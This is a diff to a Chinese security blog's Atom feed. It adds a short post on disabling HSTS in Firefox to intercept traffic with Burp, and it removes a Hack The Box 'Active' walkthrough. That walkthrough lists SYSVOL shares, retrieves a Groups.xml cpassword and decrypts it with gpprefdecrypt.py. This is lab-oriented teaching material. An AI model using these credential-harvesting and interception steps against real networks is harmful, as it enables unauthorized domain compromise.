@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://github.com/"/>
-  <updated>2020-05-19T10:05:54.274Z</updated>
+  <updated>2020-05-21T03:07:41.721Z</updated>
   <id>https://github.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>HSTS bypassing</title>
+    <link href="https://github.com/2020/05/21/HSTS-bypassing/"/>
+    <id>https://github.com/2020/05/21/HSTS-bypassing/</id>
+    <published>2020-05-21T03:05:52.000Z</published>
+    <updated>2020-05-21T03:07:41.721Z</updated>
+    
+    <content type="html"><![CDATA[<p>HSTS：HTTP Strict Transport Security<br>HSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。</p><p>firefox+burp绕过方法：</p><p>解决方法1：使用低版本firefox &lt; 3.6.25<br>浏览器的旧版本无法与HSTS标头配合使用，因此会禁用HSTS强制实施</p><p>解决方法2：导入burpsuit证书 </p><p><img src="1.png" alt=""></p><p>解决方法3：忽略HSTS检查</p><p><img src="2.png" alt=""></p><p>命名：test.currentTimeOffsetSeconds<br>value：11491200</p><p>清除history&amp;cache，然后重启浏览器</p><p><img src="3.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;HSTS：HTTP Strict Transport Security&lt;br&gt;HSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。&lt;/p&gt;
+&lt;p&gt;firefox+burp绕过方法：&lt;/p&gt;
+&lt;p&gt;解决方法1：使用低版本firefox &amp;lt; 3.6.25
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>某面试做题记录</title>
@@ -456,30 +480,6 @@ sudo impacket-smbserver share $(pwd) -smb2s
 &lt;li&gt;&lt;p&gt;Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）&lt;/p&gt;
 &lt;/li&gt;
 
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>域内提权之滥用GGP</title>
-    <link href="https://github.com/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/"/>
-    <id>https://github.com/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/</id>
-    <published>2020-04-25T13:49:13.000Z</published>
-    <updated>2020-04-25T14:46:47.301Z</updated>
-    
-    <content type="html"><![CDATA[<p>在SYSVOL查找密码组策略首选项（GPP）中的密码</p><h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p><strong>什么是GPP</strong></p><p>GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途</p><p>一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。</p><p>该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）</p><p>这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）</p><h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><p>连接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，它们将位于格式类似于以下的文件夹中：</p><pre><code>\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml</code></pre><p><strong>1、定位域控制器</strong></p><pre><code>set l   nltest /DSGETDC:echo %logonserver%net time /domain......</code></pre><p><strong>2、查询DC共享目录</strong><br>使用enumlinux或者smbmap检查共享目录：</p><pre><code>smbmap -H 10.10.10.100  ###列出目标用户共享列表---- -----------ADMIN$ NO ACCESSC$ NO ACCESSIPC$ NO ACCESSNETLOGON NO ACCESSreplication read only   SYSVOL NO ACCESSUsers NO ACCESS</code></pre><p><strong>3、连接域共享</strong></p><p>smbclient //active.htb/Replication -N</p><pre><code>smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\more Groups.xml&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;</code></pre><p><strong>4、解密</strong><br>使用<a href="https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py">gpprefdecrypt.py</a>： </p><pre><code>python gpprefdecrypt.pyedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;在SYSVOL查找密码组策略首选项（GPP）中的密码&lt;/p&gt;
-&lt;h1 id=&quot;原理：&quot;&gt;&lt;a href=&quot;#原理：&quot; class=&quot;headerlink&quot; title=&quot;原理：&quot;&gt;&lt;/a&gt;原理：&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;什么是GPP&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;G
       
     
     </summary>
